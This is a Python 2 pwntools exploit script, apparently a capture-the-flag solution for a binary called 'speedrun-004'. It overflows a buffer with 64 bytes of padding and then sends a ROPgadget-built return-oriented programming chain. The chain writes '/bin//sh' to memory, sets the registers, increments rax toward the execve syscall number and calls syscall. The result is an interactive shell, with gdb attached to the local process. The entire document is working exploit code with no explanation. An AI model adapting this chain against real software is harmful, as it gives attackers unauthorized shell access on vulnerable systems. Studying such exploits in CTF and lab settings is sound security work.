#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
import pwn

pwn.context.terminal = ['tmux', 'split', '-h']

# Padding goes here
p = 'A' * 64

p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x000000000044a155) # pop rdx ; ret             # newline will cause problem
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474f15) # syscall ; ret

proc = pwn.process('./speedrun-004')

pwn.gdb.attach(proc)
raw_input()

proc.sendline('257')
proc.send(p)

proc.interactive()